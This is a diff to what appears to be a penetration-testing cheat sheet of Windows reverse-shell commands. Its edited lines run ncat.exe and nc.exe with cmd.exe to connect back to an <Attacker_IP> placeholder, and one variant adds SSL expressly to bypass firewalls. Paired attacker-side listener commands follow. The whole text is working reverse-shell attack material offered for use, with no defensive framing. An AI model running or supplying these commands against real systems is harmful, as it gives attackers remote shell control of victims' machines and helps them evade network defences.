@@ -36,13 +36,13 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ## NCAT
 victim
 ```
-ncat.exe <Attacker_IP> <PORT>  -e cmd.exe
+ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
 #Encryption to bypass firewall
-ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e cmd.exe
+ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
 ```
 attacker
 ```
-ncat -l <PORT 443>
+ncat -l <PORT>
 #Encryption to bypass firewall
 ncat -l <PORT eg.443> --ssl
 ```
